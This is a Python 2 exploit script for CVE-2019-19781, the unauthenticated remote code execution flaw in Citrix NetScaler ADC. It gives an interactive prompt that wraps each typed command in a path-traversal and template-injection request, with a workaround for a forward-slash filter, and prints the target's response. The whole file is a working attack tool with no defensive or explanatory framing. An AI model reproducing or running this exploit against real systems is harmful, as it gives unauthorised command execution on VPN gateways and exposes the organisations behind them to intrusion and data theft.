#!/usr/bin/python2

import sys
import re
import socket
import ssl
import time
import urllib
import readline

# References:
#   https://blog.fox-it.com/2020/07/01/a-second-look-at-cve-2019-19781-citrix-netscaler-adc/
#   https://github.com/abw/Template2/issues/245

print("\n-------------------------------------------------------")
print("CITRIX Unauthenticated Remote Code Execution")
print("CVE-2019-19781")
print("script by: https://github.com/w4fz5uck5")
print("---------------------------------------------------------\n")

try:
    
    host = sys.argv[1]
    port = int(sys.argv[2])
    
except:
    
    print("\nUsage: %s <host> <port>\n" % sys.argv[0])
    sys.exit(0)
    
while 1:
    
    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s_sock = context.wrap_socket(s, server_hostname=host)
    s_sock.connect((host, port))

    cmd = raw_input("# ")
    if "/" in cmd:
        cmd = cmd.replace("/", "\\$(printf \\$HOME)") # bypass weird forward slash ("/") protection
        
    encoded_cmd = urllib.quote(cmd, safe="")
        
    req_1 = (
        "GET /vpn/../vpns/portal/corp[%25template.new({'BLOCK'%3d'print%20`" + encoded_cmd  + "`%3b'})%25].xml HTTP/1.1\r\n" 
        "Host: " + host + "\r\n"
        "NSC_USER: ../../../../../netscaler/portal/templates/corp[%template.new({'BLOCK'='print `" + cmd + "`;'})%]\r\n"
        "NSC_NONCE: aealaa\r\n"
        "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n\r\n"
    )
    
    try:
        
        s_sock.sendall(req_1)
        print(str(s_sock.recv(9999999)))
        
    except Exception as err:
        print("[-] " + str(err))
        pass
